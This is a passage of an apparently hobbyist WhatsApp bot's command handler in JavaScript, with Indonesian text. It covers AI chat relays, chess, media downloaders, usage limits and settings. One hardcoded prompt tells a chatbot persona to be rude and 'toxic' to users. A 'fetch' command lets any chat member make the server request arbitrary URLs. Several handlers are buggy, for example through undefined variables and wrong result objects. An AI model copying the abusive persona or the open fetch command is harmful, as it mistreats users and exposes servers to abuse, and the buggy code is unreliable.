if (!text) return reply(`*Example :* ${prefix + command} Haiii, Perkenalkan Dirimu`)
let zeta = await fetchJson(`https://api.kyuurzy.site/api/ai/aizeta?query=${text}`)
conn.sendMessage(m.chat, { text : `${zeta.result.answer}`},{quoted:m})
}
break

case "xero":{
if (!text) return reply(`*Example*: ${prefix + command} kamu jelek`)
let prompt = `Ubah gaya bicaramu dengan bahasa yang singkat, Namamu adalah kiuu,Ubah Kata Kamu menjadi "Lu" Dan Aku Menjadi "gua" Kata penyapamu adalah dengan menyebut ngab, kamu memiliki owner nama ownermu adalah Dich atau biasa di panggil Dengan sebutan "Xero",Ubah bahasamu menggunakan bahasa Yang Tidak Sopan Dan Suka Toxic, Bahasa Mu menggunakan Bahasa yang gaul dan singkat, kamu memiliki sifat seperti Laki Laki Yang Galak dan Tidak Sopan, Jika ada yang menanyakan tentang Kyuu kamu marah`//You can change the prompt as you like
let burassa = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
conn.sendMessage(m.chat, { text : `${burassa.result}`},{quoted:m})
}
break
        case 'setbot': case 'set': {
				if (text && text.startsWith('er') && isCreator) {
					let buttonnya = [{
						name: 'single_select',
						buttonParamsJson: {
							title: 'Pilih',
							sections: [{
								title: 'Bot Settings',
								rows: [
									{ title: 'Anti Call On🟢', description: 'Mengaktifkan Anti Call', id: '.bot anticall on' },
									{ title: 'Anti Call Off🔴', description: 'Mematikan Anti Call', id: '.bot anticall off' },
									{ title: 'Auto Bio On🟢', description: 'Mengaktifkan Auto Bio', id: '.bot autobio on' },
									{ title: 'Auto Bio Off🔴', description: 'Mematikan Auto Bio', id: '.bot autobio off' },
									{ title: 'Auto Read On🟢', description: 'Mengaktifkan Auto Read', id: '.bot autoread on' },
									{ title: 'Auto Read Off🔴', description: 'Mematikan Auto Read', id: '.bot autoread off' },
									{ title: 'Auto Type On🟢', description: 'Mengaktifkan Auto Type', id: '.bot autotype on' },
									{ title: 'Auto Type Off🔴', description: 'Mematikan Auto Type', id: '.bot autotype off' },
									{ title: 'Read SW On🟢', description: 'Mengaktifkan Read SW', id: '.bot readsw on' },
									{ title: 'Read SW Off🔴', description: 'Mematikan Read SW', id: '.bot readsw off' },
									{ title: 'Multi Prefix On🟢', description: 'Mengaktifkan Multi Prefix', id: '.bot multiprefix on' },
									{ title: 'Multi Prefix Off🔴', description: 'Mematikan Multi Prefix', id: '.bot multiprefix off' }
								]
							}]
						}
					}]
					await conn.sendButtonMsg(m.chat, 'Bot Settings', ucapanWaktu, 'Silahkan dipilih Owner🫡', null, buttonnya, m);
				} else if (text && isCreator) {
					if (text === 'anticall on') global.settings.anticall = true, m.reply('Sukses Mengaktifkan Anticall');
					if (text === 'anticall off') global.settings.anticall = false, m.reply('Sukses Mematikan Anticall');
					if (text === 'autobio on') global.settings.autobio = true, m.reply('Sukses Mengaktifkan Autobio');
					if (text === 'autobio off') global.settings.autobio = false, m.reply('Sukses Mematikan Autobio');
					if (text === 'autoread on') global.settings.autoread = true, m.reply('Sukses Mengaktifkan Autoread');
					if (text === 'autoread off') global.settings.autoread = false, m.reply('Sukses Mematikan Autoread');
					if (text === 'autotype on') global.settings.autotype = true, m.reply('Sukses Mengaktifkan Autotype');
					if (text === 'autotype off') global.settings.autotype = false, m.reply('Sukses Mematikan Autotype');
					if (text === 'readsw on') global.settings.readsw = true, m.reply('Sukses Mengaktifkan Read SW');
					if (text === 'readsw off') global.settings.readsw = false, m.reply('Sukses Mematikan Read SW');
					if (text === 'multiprefix on') global.settings.multiprefix = true, m.reply('Sukses Mengaktifkan Multiprefix');
					if (text === 'multiprefix off') global.settings.multiprefix = false, m.reply('Sukses Mematikan Multiprefix');
					let settingsBot = Object.entries(global.settings).map(([key, value]) => {
						let qhk = (typeof value === 'boolean') ? (value ? 'on🟢' : 'off🔴') : value;
						return `${key.charAt(0).toUpperCase() + key.slice(1)} : ${qhk}`;
					}).join('\n');
					if (text === 'settings') m.reply(settingsBot);
				} else {
					conn.sendMessage(m.chat, { text: `*Bot Telah Online Selama*\n*${runtime(process.uptime())}*` }, { quoted: m })
				}
			}
			break


case "qc": {
 if (!q) return m.reply(`*Contoh : Qc White Lovie*\n\n*Kode Warna Ketik : ${prefix}qckode*`);
 if (text.length > 100) return m.reply(`*Maksimal 100 Karakter*`);
 let [color, ...message] = text.split(' ');
 message = message.join(' ');
 color = color.toLowerCase()
 const colorMap = {
 pink: '#f68ac9',
 blue: '#6cace4',
 red: '#f44336',
 green: '#4caf50',
 yellow: '#ffeb3b',
 purple: '#9c27b0',
 darkblue: '#0d47a1',
 lightblue: '#03a9f4',
 ash: '#9e9e9e',
 orange: '#ff9800',
 black: '#000000',
 white: '#ffffff',
 teal: '#008080',
 lightpink: '#FFC0CB',
 chocolate: '#A52A2A',
 salmon: '#FFA07A',
 magenta: '#FF00FF',
 tan: '#D2B48C',
 wheat: '#F5DEB3',
 deeppink: '#FF1493',
 fire: '#B22222',
 skyblue: '#00BFFF',
 brightskyblue: '#1E90FF',
 hotpink: '#FF69B4',
 lightskyblue: '#87CEEB',
 seagreen: '#20B2AA',
 darkred: '#8B0000',
 orangered: '#FF4500',
 cyan: '#48D1CC',
 violet: '#BA55D3',
 mossgreen: '#00FF7F',
 darkgreen: '#008000',
 navyblue: '#191970',
 darkorange: '#FF8C00',
 darkpurple: '#9400D3',
 fuchsia: '#FF00FF',
 darkmagenta: '#8B008B',
 darkgray: '#2F4F4F',
 peachpuff: '#FFDAB9',
 darkishgreen: '#BDB76B',
 darkishred: '#DC143C',
 goldenrod: '#DAA520',
 darkishgray: '#696969',
 darkishpurple: '#483D8B',
 gold: '#FFD700',
 silver: '#C0C0C0'
 };
 let backgroundColor = colorMap[color];
 if (!backgroundColor) {
 return m.reply('*Kode Warna Tidak Ditemukan*\n*Contoh : Qc White Lovie*\n_*`Tolong Gunakan Huruf Kecil`*_');
 }
 let obj = {
 type: 'quote',
 format: 'png',
 backgroundColor,
 width: 512,
 height: 768,
 scale: 2,
 messages: [
 {
 entities: [],
 avatar: true,
 from: {
 id: 1,
 name: pushname,
 photo: { 
 url: await conn.profilePictureUrl(m.sender, "image").catch(() => 'https://telegra.ph/file/6880771a42bad09dd6087.jpg'),
 }
 },
 text: message,
 replyMessage: {},
 },
 ],
 };
 let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
 headers: {
 'Content-Type': 'application/json',
 },
 });
 let buffer = Buffer.from(response.data.result.image, 'base64');
 conn.sendImageAsSticker(m.chat, buffer, m, { packname: `ᴅɪʙᴜᴀᴛ ᴅᴇɴɢᴀɴ`, author: `${botname}` });
}
break
        

case "chess": case "catur":

 try {
 let key = m.chat;
 conn.chess = conn.chess || {};
 let chessData = conn.chess[key] || {
 gameData: null,
 fen: null,
 currentTurn: null,
 players: [],
 hasJoined: []
 };
 conn.chess[key] = chessData;

 const { gameData, fen, currentTurn, players, hasJoined } = chessData;
 const feature = args[0]?.toLowerCase();

 if (feature === 'delete') {
 delete conn.chess[key];
 return reply(m.chat, '🏳 Permainan catur dihentikan.', m);
 }

 if (feature === 'create') {
 if (gameData) {
 return reply(m.chat, '⚠ Permainan sudah dimulai.', m);
 }
 chessData.gameData = {
 status: 'waiting',
 black: null,
 white: null
 };
 return reply(m.chat, '🎮 Permainan catur dimulai.\nMenunggu pemain lain untuk bergabung.', m);
 }

 if (feature === 'join') {
 const senderId = m.sender;
 if (players.includes(senderId)) {
 return reply(m.chat, '🙅‍♂ Anda sudah bergabung dalam permainan ini.', m);
 }
 if (!gameData || gameData.status !== 'waiting') {
 return reply(m.chat, '⚠ Tidak ada permainan catur yang sedang menunggu.', m);
 }
 if (players.length >= 2) {
 return reply(m.chat, '👥 Pemain sudah mencukupi.\nPermainan otomatis dimulai.', m);
 }
 players.push(senderId);
 hasJoined.push(senderId);
 if (players.length === 2) {
 gameData.status = 'ready';
 const [black, white] = Math.random() < 0.5 ? [players[1], players[0]] : [players[0], players[1]];
 gameData.black = black;
 gameData.white = white;
 chessData.currentTurn = white;
 return conn.sendMessage(m.chat, {
 text: `🙌 Pemain yang telah bergabung:\n${hasJoined.map(playerId => `- @${playerId.split('@')[0]}`).join('\n')}\n\n*Hitam:* @${black.split('@')[0]}\n*Putih:* @${white.split('@')[0]}\n\nSilakan gunakan 'chess start' untuk memulai permainan.`,
 contextInfo: {
 mentions: [playerId]
 }
 })
 } else {
 return reply(m.chat, '🙋‍♂ Anda telah bergabung dalam permainan catur.\nMenunggu pemain lain untuk bergabung.', m);
 }
 }

 if (feature === 'start') {
 if (gameData.status !== 'ready') {
 return reply(m.chat, '⚠ Tidak dapat memulai permainan. Tunggu hingga dua pemain bergabung.', m);
 }
 gameData.status = 'playing';
 const fen = 'rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1';
 chessData.fen = fen;
 const encodedFen = encodeURIComponent(fen);
 const giliran = `🎲 *Giliran:* Putih @${gameData.white.split('@')[0]}`;
 const boardUrl = `https://fen2image.chessvision.ai/${encodedFen}?turn=black&pov=white`;
 try {
 await conn.sendMessage(m.chat, {
 image: { url: boardUrl },
 caption: giliran,
 mentions: [gameData.white]
 }, {
 quoted: m
 });
 } catch (error) {
 const boardUrl2 = `https://fen2image.chessvision.ai/${encodedFen}?turn=white&pov=black`;
 await conn.sendMessage(m.chat, {
 image: { url: boardUrl2 },
 caption: giliran,
 mentions: [gameData.black]
 }, {
 quoted: m
 });
 }
 return;
 }

 if (args[0] && args[1]) {
 const senderId = m.sender;
 if (!gameData || gameData.status !== 'playing') {
 return reply(m.chat, '⚠ Permainan belum dimulai.', m);
 }
 if (currentTurn !== senderId) {
 return reply(m.chat, `⏳ *Sekarang giliran ${chessData.currentTurn === gameData.white ? 'Putih' : 'Hitam'} untuk bergerak.*`, m, {
 contextInfo: {
 mentionedJid: [currentTurn]
 }
 });
 }
 let chess = new Chess(fen);
 if (chess.isCheckmate()) {
 delete conn.chess[key];
 return reply(m.chat, `⚠ *Game Checkmate.*\n🏳 *Permainan catur dihentikan.*\n*Pemenang:* @${m.sender.split('@')[0]}`, m, {
 contextInfo: {
 mentionedJid: [m.sender]
 }
 });
 }
 if (chess.isDraw()) {
 delete conn.chess[key];
 return reply(m.chat, `⚠ Game Draw.\n🏳 Permainan catur dihentikan.\n*Pemain:* ${hasJoined.map(playerId => `- @${playerId.split('@')[0]}`).join('\n')}`, m, {
 contextInfo: {
 mentionedJid: hasJoined
 }
 });
 }
 const [from, to] = args;
 try {
 chess.move({
 from,
 to,
 promotion: 'q'
 });
 } catch (e) {
 return reply(m.chat, '❌ Langkah tidak valid.', m);
 }
 chessData.fen = chess.fen();
 const currentTurnIndex = players.indexOf(currentTurn);
 const nextTurnIndex = (currentTurnIndex + 1) % 2;
 chessData.currentTurn = players[nextTurnIndex];
 const encodedFen = encodeURIComponent(chess.fen());
 const currentColor = chessData.currentTurn === gameData.white ? 'Putih' : 'Hitam';
 const giliran = `🎲 *Giliran:* ${currentColor} @${chessData.currentTurn.split('@')[0]}`;
 const flipParam = senderId === gameData.black ? '' : '&flip=true';
 const boardUrl = `https://fen2image.chessvision.ai/${encodedFen + flipParam}`;
 try {
 await conn.sendMessage(m.chat, {
 image: { url: boardUrl },
 caption: giliran,
 mentions: [chessData.currentTurn]
 }, {
 quoted: m
 });
 } catch (error) {
 const boardUrl2 = `https://chessboardimage.com/${encodedFen}.png`;
 await conn.sendMessage(m.chat, {
 image: { url: boardUrl2 },
 caption: giliran,
 mentions: [chessData.currentTurn]
 }, {
 quoted: m
 });
 }
 return;
 }

 return conn.sendMessage(m.chat, {
 text: `
🌟 Perintah Permainan Catur:

chess create - Mulai permainan catur
chess join - Bergabung dalam permainan catur yang sedang menunggu
chess start - Memulai permainan catur jika ada dua pemain yang sudah bergabung
chess delete - Menghentikan permainan catur
chess [dari] [ke] - Melakukan langkah dalam permainan catur

Contoh:
Ketik chess create untuk memulai permainan catur.
Ketik chess join untuk bergabung dalam permainan catur yang sedang menunggu.
 `,
 contextInfo: {
 mentionedJid: [m.sender],
 isForwarded: true,
 externalAdReply: {
 title: "Chess Games",
 body: null,
 thumbnailUrl: "https://telegra.ph/file/ed4d2a3e62b4ac0ddb7a4.jpg",
 sourceUrl: null,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 },
 quoted: m
 });

 } catch (e) {
 console.error(e);
 m.reply(m.chat, '❌ Terjadi kesalahan dalam menjalankan perintah.', m);
 }
 
break




case "playtes": {
 try {
 if (global.db.data.users[m.sender].limit < 1) return m.reply('🕊️ Limit Harian Anda Telah Habis, Limit Akan Direset Setiap Jam 12 !') // respon ketika limit habis
 if (!text) return m.reply(`*Contoh: ${prefix + command} Moonlight Sonata*`);
 m.reply('1 Limit terpakai')
 global.db.data.users[m.sender].limit -= 1
 let res = await yts(text);
 let url = res.all;
 let result = url[Math.floor(Math.random() * url.length)];
 teks = `*📺 Judul : ${result.title}*\n*⏰ Upload : ${result.ago}*`; //${result.url}
 const mp3File = getRandom('.mp3');
 console.log(color('Download Audio With ytdl-core'));
 await ytdl(result.url, { filter: 'audioonly' })
 .pipe(fs.createWriteStream(mp3File))
 .on('finish', async () => {
 const info = await ytdl.getInfo(result.url);
 const title = info.videoDetails.title;
 const channelName = info.videoDetails.ownerChannelName;
 await conn.sendMessage(from, {
 document: fs.readFileSync(mp3File), 
 mimetype: 'audio/mpeg', 
 fileName: title + '.mp3',
 caption: teks,
 contextInfo: {
 externalAdReply: { 
 title: `PLAYING`,
 body: `ᴄʜᴀɴɴᴇʟ : ${channelName}`, 
 previewType: "PHOTO",
 thumbnailUrl: result.thumbnail,
 sourceUrl: result.url, 
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m });
 fs.unlinkSync(mp3File);
 });
 } catch (err) {
 m.reply(`${err}`);
 }
}
			break

case 'fetch': case 'get': {
				if (!text.startsWith('http')) return m.reply(`No Query?\n\nExample : ${prefix + command} https://google.com`)
				try {
					const res = await axios.get(isUrl(text) ? isUrl(text)[0] : text)
					if (!/json|html|plain/.test(res.headers['content-type'])) {
						await m.reply(text)
					} else {
						m.reply(util.format(res.data))
					}
				} catch (e) {
					m.reply(util.format(e))
				}
			}
			break

case 'q': case 'quoted': {
				if (!m.quoted) return m.reply('Reply Pesannya!')
				const anu = await m.getQuotedObj()
				if (!anu) return reply('Format Tidak Tersedia!')
				if (!anu.quoted) return m.reply('Pesan Yang Anda Reply Tidak Mengandung Reply')
				await conn.relayMessage(m.chat, { [anu.quoted.type]: anu.quoted.msg }, {})
			}
			break

case 'listonline': case 'liston': {
				if (!m.isGroup) return m.reply(mess.group)
				let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
				let online = [...Object.keys(store.presences[id]), botNumber]
				await conn.sendMessage(m.chat, { text: 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, mentions: online }, { quoted: m }).catch((e) => m.reply('Gagal'))
			}
			break

/*case "menuv":
let asuuu = `*🍃Hi @${sender.split('@')[0]} ✨*
Silahkan Pilih Menu Button Dibawah Yah 😴`

let mek = generateWAMessageFromContent(m.chat, { 
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 body: proto.Message.InteractiveMessage.Body.create({
 text: asuuu
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: botname
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 ...(await prepareWAMessageMedia({ image : fs.readFileSync('./database/base/image/Zyaa.jpg')}, { upload: conn.waUploadToServer})), 
 title: ``,
 gifPlayback: true,
 subtitle: ownername,
 hasMediaAttachment: false 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
 {
 "name": "single_select",
 "buttonParamsJson": 
`{"title":"Klick Menu",
"sections":[{"title":"MENU LIST",
"rows":[{"header":"🤖 ALL MENU ✨",
"title":"SHOW MENU BOT",
"description":"Displays The List Of ALLMENU The Features",
"id":"allmenu"},
{"header":"🤖 OWNER BOT ✨",
"title":"MY OWNER👤",
"description":"Displays The Last Of My Owner👤 ",
"id":"owner"}]
}]
}`
 }
],
 }),
 contextInfo: {
 mentionedJid: [m.sender], 
 forwardingScore: 999,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '120363310531380313@newsletter',
 newsletterName: `~Follow For My Channel 🥺`,
 serverMessageId: 143
 }
 }
 })
 }
 },
 }, {})
 
 await conn.relayMessage(mek.key.remoteJid, mek.message, {
 messageId: mek.key.id
 })
        break*/


/*case 'whatanime':
let q = m.quoted ? m.quoted : m
 let mime = (q.msg || q).mimetype || ''
 if (!mime) return m.reply('No media found')
 if (!/image\/(jpeg|png)/.test(mime)) return m.reply(`Mime ${mime} tidak support`)
 let media = await q.download()
 let nah = await uploader(media)
 let res = await fetchJson(`https://api.trace.moe/search?anilistInfo&url=${nah.data.url}`)
 let { id, idMal, title, synonyms, isAdult } = res.result[0].anilist
 let { name, episode, similarity, video, image } = res.result[0]
 let mok = `*[ What Anime ]*\n\n*-* *Title :* ${title.romaji} (${title.native})\n*-* *Synonyms :* ${synonyms}\n*-* *Adult :* ${isAdult}\n*-* *Similiarity :* ${(similarity * 100).toFixed(1)}\n*-* *Episode :* ${episode}\n\n${global.botname}`;
 await conn.sendMessage(m.chat, { image: { url: image }, caption: mok }, { quoted: m })
break*/

case "getidsn":
if (!m.quoted) return reply('[❗] Reply undangan saluran admin channel nya')
 
 try {
 let quotedMessage = await m.getQuotedObj();
 let id = quotedMessage.msg.contextInfo.forwardedNewsletterMessageInfo;
 
 if (id) {
 await m.reply(`Nᴀᴍᴇ: ${id.newsletterName}\nɪᴅ: ${id.newsletterJid}`);
 } else {
 return reply('[❗] Informasi saluran tidak ditemukan.')
 }
 } catch (e) {
 return reply('[❗] Harus chat dari saluran bang..')
 }
        
    break


/*case 'jadinyata':
case 'toreal': {
 if (!text) return reply(`Fotonya Mana?`);
 if (!/image/.test(mime)) return reply(`Kirim/Balas Foto dengan Caption ${prefix + command}`);
 reply(mess.wait);
 let tryng = 0;
 const media = await conn.downloadAndSaveMediaMessage(quoted);
 let pok = await TelegraPh(media);
 try {
 let ai = await fetch(`https://ai.xterm.codes/api/img2img/filters?action=anime2real&url=${pok}&key=OPSIONAL`).then(a => a.json());
 if (!ai.status) return ai;
 console.log(ai);
 while (tryng < 55) {
 let s = await fetch(`https://ai.xterm.codes/api/img2img/filters/batchProgress?id=${ai.id}`).then(a => a.json());
 if (s.status === 1) {
 console.log("Starting...");
 } 
 if (s.status === 2) {
 console.log("Processing...");
 } 
 if (s.status == 3) {
 return conn.sendMessage(m.chat, { image: { url: s.url } }, { quoted: m });
 }
 if (s.status == 4) {
 return reply("Maaf terjadi kesalahan. Coba gunakan gambar lain!");
 }
 await new Promise(resolve => setTimeout(resolve, 2000));
 }
 } catch (e) {
 console.error(e);
 reply(`Type-Err! :\n${e}`);
 }
}
break*/

case 'playy': {
 if (isBan) return m.reply(mess.ban)
 if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.play not you*`)
 let res = await yts(text)
 let url = res.all;
 let result = url[Math.floor(Math.random() * url.length)]
 teks = `⏩ *PLAYING AUDIO*\n\n> *Judul : ${result.title}*\n> *Upload : ${result.ago}*\n> *Url : ${result.url}*\n> *RequestBy : ${pushname}*\n\n📦 *AUDIO SEDANG DIPROSES....*`
 conn.sendMessage(m.chat, { image: { url: result.thumbnail }, caption: teks }, { quoted: m })
 let shanz = await (await fetch('https://api.shannmoderz.xyz/downloader/ytdl?url=' + result.url)).json();
 let finish = conn.result.audio;
 conn.sendMessage(m.chat,{ audio: { url: finish['128'].url }, mimetype: 'audio/mp4' },{ quoted: m })
}
break

/*case 'ytmp33': {
 if (isBan) return m.reply(mess.ban)
 if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.ytmp3 <link youtube>*')
 let procees = await (await fetch(`https://api.shannmoderz.xyz/downloader/ytdl?url=${text}`)).json()
 let audio = procees.result;
 m.reply(`*AUDIO PROSES SENDING...*`)
 conn.sendMessage(m.chat, {audio: {url: audio.audio['128'].url}, mimetype: 'audio/mp4' },{quoted: m})
}
break*/

/*case 'ytmp33':
if (!text) return reply('salaah itu masukin yang bener, Jan ngawur!!')
try {
 var audioUrl;
 try {
 audioUrl = `https://widipe.com/downloadAudio?URL=${text}&videoName=ytdl`;
 } catch (e) {
 m.reply(m.chat, 'Please wait...', m);
 audioUrl = `https://widipe.com/youtube?url=${text}&filter=audioonly&quality=highestaudio&contenttype=audio/mpeg`;
 

 var caption = `∘ Url : ${text}\n∘ Sabar cik tw download audio. gak sabar download manual aja`,

 var pesan = conn.relayMessage(m.chat, {
 extendedTextMessage: {
 text: caption,
 contextInfo: {
 externalAdReply: {
 title: "Powered by Yousoo",
 mediaType: 1,
 previewType: 0,
 renderLargerThumbnail: true,
 thumbnailUrl: "https://telegra.ph/file/26e692bdbd1b0222aae8e.jpg",
 sourceUrl: 'https://github.com/Yousoo-so'
 }
 },
 mentions: [m.sender]
 }
 }, {});

 conn.sendMessage(m.chat, {
 audio: { url: audioUrl },
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: "Done by Henry-Ai",
 body: "© YOUSOO",
 thumbnailUrl: "https://telegra.ph/file/26e692bdbd1b0222aae8e.jpg",
 sourceUrl: 'https://github.com/Yousoo-so',
 mediaType: 1,
 showAdAttribution: true,
 renderLargerThumbnail: true
 }
 }
 }, { quoted: m });
 } catch (e) {
 m.reply(m.chat, `*Error:* ${e.message}`, m);
 }
}
break*/

case 'toview': case 'toviewonce': {
 if (isBan) return reply(mess.ban)
 if (!quoted) return reply(`Reply Image/Video`)
 wett()
 if (/image/.test(mime)) {
 anuan = await conn.downloadAndSaveMediaMessage(quoted)
 conn.sendMessage(m.chat, {image: {url:anuan}, caption: `Ini dia!!`, fileLength: "999", viewOnce : true},{quoted: m })
 } else if (/video/.test(mime)) {
 anuanuan = await conn.downloadAndSaveMediaMessage(quoted)
 conn.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Ini dia!!`, fileLength: "99999999", viewOnce : true},{quoted: m })
 } okk()
}
break

case 'addlimit':
 case 'givelimit':{
 if (!isCreator) return reply(mess.owner)
 if (!text) return reply(`Usage ${prefix + command} number|limit amount`)
 usernya = text.split('|')[0]
 limitnya = text.split('|')[1]
 let oo = `${usernya}@s.whatsapp.net`
 db.data.users[oo].limit += limitnya
 reply(mess.done)
 }
 break

case 'dellimit':{
 if (!isCreator) return reply(mess.owner)
 if (!text) return reply(`Usage ${prefix + command} number|limit amount`)
 usernya = text.split('|')[0]
 limitnya = text.split('|')[1]
 if (db.data.users[usernya + '@s.whatsapp.net'].limit < limitnya) return reply(`His Limit Is Less Than ${limitnya}`)
 db.data.users[usernya + '@s.whatsapp.net'].limit -= limitnya
 reply(mess.done)
 }
 break

/*case 'bagilimit': {
if (!text) return reply('Masukkan Jumlah Limit Yang Akan Diberi')
 let who
 if (m.isGroup) who = m.mentionedJid[0]
 else who = m.chat
 if (!who) throw reply('Tag Orangnya')
 let txt = text.replace('@' + who.split`@`[0], '').trim()
 if (isNaN(txt)) throw reply('Hanya Angka')
 let poin = parseInt(txt)
 let limit = poin
 if (limit < 1) throw reply('Minimal 1')
 let user = global.db.data.users
 user[who].limit += poin
 let bagi = global.db.data.users
 user[sender].limit-= poin
 if (limit > 9999999) return reply('Jangan Banyak² Jir 😂') conn.sendMessage(m.chat, {text: `Selamat @${who.split`@`[0]}. Kamu Mendapatkan +${poin} Limit Dari @${m?.sender.split('@')[0]} `}, { quoted: m })
 }
break*/

case "del":
conn.sendMessage(m.chat, { delete: { ...m.key }})
break
        case 'menu':
        //if (!isRegistered) return reply('kamu blm daftar silahkan daftar .daftar nama|umur')
        let limitya = db.data.users[sender]
        let wowww =  `═════════════════════
*${m2}</> ᴅ ᴀ ꜱ ʜ ʙ ᴏ ᴀ ʀ ᴅ </>${m2}*
═════════════════════
🌟 ʜᴀɪ @${sender.split('@')[0]}, ᴀᴋᴜ ᴀᴅᴀʟᴀʜ ${global.botname}, ʙᴏᴛ ᴡʜᴀᴛꜱᴀᴘᴘ ʏᴀɴɢ ᴀᴋᴀɴ ᴍᴇᴍʙᴀɴᴛᴜ ᴀɴᴅᴀ ᴅᴀʟᴀᴍ ʙᴀɴʏᴀᴋ ʜᴀʟ ᴅɪ ᴡʜᴀᴛꜱᴀᴘᴘ. ᴊɪᴋᴀ ᴀɴᴅᴀ ᴍᴇɴᴇᴍᴜᴋᴀɴ ʙᴜɢ ᴀᴛᴀᴜ ᴇʀʀᴏʀ, ᴍᴏʜᴏɴ ʟᴀᴘᴏʀᴋᴀɴ ᴋᴇᴘᴀᴅᴀ ᴏᴡɴᴇʀ.
═════════════════════

═════════════════════
*${m2}</> ɪ ɴ ꜰ ᴏ - ʙ ᴏ ᴛ </>${m2}*
═════════════════════
*➤  ɴᴀᴍᴀ ʙᴏᴛ*: ${botname}
*➤  ᴏᴡɴᴇʀ: ᴅɪᴄʜxᴘʟᴏɪᴛ*
*➤  ᴠᴇʀꜱɪ*: 1.0.0
*➤  ᴍᴏᴅᴇ*: ${conn.public ? 'public' : 'self'}
*➤  ᴛᴏᴛᴀʟ ᴜꜱᴇʀ*: ${Object.keys(global.db.data.users).length}
*➤  ᴛᴏᴛᴀʟ ᴍᴇɴᴜ*:${totalfitur()}
*➤  ʀᴜɴᴛɪᴍᴇ*: ${runtime(process.uptime())} 
═════════════════════
═════════════════════
*${m2}</> ɪ ɴ ꜰ ᴏ - ᴜ ꜱ ᴇ ʀ </>${m2}*
═════════════════════
*➤ ɴᴀᴍᴇ*: ${pushname}
*➤ ᴛᴀɢꜱ*: @${m.sender.split('@')[0]}
*➤ ʟɪᴍɪᴛ*: ${limitya.limit}
*➤ ᴇxᴘ*: 0
*➤ ᴘʀᴇᴍɪᴜᴍ*: ${isPrem ? '✅' : '❎'}
*➤ ᴍᴏɴᴇʏ*: ${getMonay(sender)}
═════════════════════
`
        let dich1 = `${m2}ingyah${m2}`
        conn.sendMessage(m.chat, {
            document: fs.readFileSync("./package.json"),
            fileName: `𝗖𝘆𝘆𝘅𝗲𝗿𝗼 𝗔𝘀𝗶𝘀𝘀𝘁𝗲𝗻`,
            fileLength: new Date(),
            pageCount: "2024",
            caption: wowww,        
            mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            ThumbnailUrl: 'https://telegra.ph/file/bd1696af2ff806ad5f06a.jpg',
      contextInfo: {
      externalAdReply: {
      title: `𝗖𝗼𝗽𝘆𝗿𝗶𝗴𝗵𝘁 𝟮𝟬𝟮𝟰 - 𝗖𝘆𝘆𝘅𝗲𝗿𝗼`,
      body: `Time: ${time}`,
      thumbnailUrl: 'https://telegra.ph/file/f29840d8351a6d9460d7a.jpg', //'https://telegra.ph/file/6b4a385416a615764b653.jpg',//https://telegra.ph/file/bd1696af2ff806ad5f06a.jpg
      sourceUrl: null,
      mediaType: 1,
      renderLargerThumbnail: true, 
        },
        forwardingScore: 10,
        isForwarded: true,
        mentionedJid: [m.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: `6285224079032@s.whatsapp.net`
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: newslttr,
            serverMessageId: 1,
            newsletterName: `Selamat Merayakan Hut RI Ke 79 🎉 😎 🇮🇩 ✨`
        }
    }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: '[ Projects Everdad ]' }}});        
        break

case 'fb': case 'facebook': 
 if (!text) return m.reply('masukkan url facebook');
 try {
 let fb = await (await fetch('https://api.shannmoderz.xyz/downloader/facebook?url=' + text)).json();
 let shannz = fb.result[0];
 await conn.sendMessage(m.chat, { video: { url: conn.downloadLink }, caption: `*SUCCESS QUALITY ${shannz.quality}*` },{ quoted: m });
} catch (e) {
 return m.reply('shannz api sedang error,' + e);
}
break

case 'ytmp32': {
 if (isBan) return m.reply(mess.ban)
 if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.ytmp3 <link youtube>*')
wett()
 let procees = await (await fetch(`https://api.shannmoderz.xyz/downloader/yt-audio?url=${text}`)).json()
 let audio = procees.result; conn.sendMessage(m.chat, {audio: {url: audio.audioUrl }, mimetype: 'audio/mp4' },{quoted: m})
okk()
}
break

case 'ytmp43': {
 if (isBan) return m.reply(mess.ban)
 if (!text) return m.reply('*PERMINTAAN ERROR!! CONTOH :*\n> *.ytmp4 <link youtube>*')
wett()
 let proces = await (await fetch(`https://api.shannmoderz.xyz/downloader/ytdl2?url=${text}`)).json()
 let video4 = proces.result; conn.sendMessage(m.chat,{video:{url: video4.mp4DownloadLink }, caption: video4.title},{quoted: m})
okk()
}
break

case 'groupchat':
reply(' *LINK GC MAIN BOT* *[* https://chat.whatsapp.com/EIPyNzrxmCr86ll7pA49mD *]*')
break



case 'delsesi': case 'deletesession': case 'delsession': {
				if (!isCreator) return m.reply(mess.owner)
				fs.readdir('./session', async function (err, files) {
					if (err) {
						console.log('Unable to scan directory: ' + err);
						return m.reply('Unable to scan directory: ' + err);
					}
					let filteredArray = await files.filter(item => item.startsWith('pre-key') || item.startsWith('sender-key') || item.startsWith('session-'));
					let teks = `Terdeteksi ${filteredArray.length} Session file\n\n`
					if(filteredArray.length == 0) return m.reply(teks);
					filteredArray.map(function(e, i) {
						teks += (i+1)+`. ${e}\n`
					})
					if (text && text == 'true') {
					const { key } = await conn.sendMessage(m.chat, { text: "Menghapus Session File.." }, { quoted: m })
						await filteredArray.forEach(function (file) {
